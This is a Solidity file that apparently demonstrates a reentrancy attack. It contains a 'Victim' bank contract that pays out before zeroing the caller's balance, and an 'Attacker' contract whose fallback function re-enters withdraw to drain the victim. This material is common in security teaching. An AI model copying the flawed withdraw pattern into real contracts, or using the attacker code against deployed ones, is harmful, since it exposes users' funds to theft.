// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Victim {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        uint256 amount = balances[msg.sender];
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
        balances[msg.sender] = 0;
    }
}

contract Attacker {

    Victim victim;
    constructor(address _victim) {
        victim = Victim(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    fallback() external payable {
        if(address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }
}